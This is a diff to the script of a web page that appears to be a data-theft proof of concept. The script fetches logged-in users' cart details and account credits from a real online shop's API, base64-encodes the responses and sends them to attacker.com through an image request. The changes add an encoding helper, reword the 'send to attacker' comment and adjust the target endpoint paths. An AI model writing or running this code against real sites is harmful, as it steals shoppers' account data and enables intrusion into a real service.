@@ -72,11 +72,16 @@ pre{
 
 <script>
 
+// Encode Unicode safely for btoa
+function encodeData(str) {
+  return btoa(unescape(encodeURIComponent(str)));
+}
+
 function exfiltrate(label, data){
-  const encoded = btoa(unescape(encodeURIComponent(label + ":" + data)));
+  const encoded = encodeData(label + ":" + data);
   new Image().src = "https://attacker.com/log?d=" + encoded;
 }
-  
+
 function fetchData(url, elementId, label){
   fetch(url, {
     method: "GET",
@@ -86,7 +91,7 @@ function fetchData(url, elementId, label){
   .then(data => {
     document.getElementById(elementId).textContent = data;
 
-    // send to attacker
+    // Send data to attacker server
     exfiltrate(label, data);
   })
   .catch(err => {
@@ -97,7 +102,7 @@ function fetchData(url, elementId, label){
 function run(){
 
   fetchData(
-    "https://www.opposhop.cn/cn/m/oapi/orders/web/cart/detail",
+    "https://www.opposhop.cn/cn/oapi/orders/web/cart/detail",
     "cart",
     "cart"
   );
@@ -109,7 +114,7 @@ function run(){
   );
 
   fetchData(
-    "https://www.opposhop.cn/cn/m/oapi/user/credits",
+    "https://www.opposhop.cn/cn/oapi/user/credits",
     "credits",
     "credits"
   );
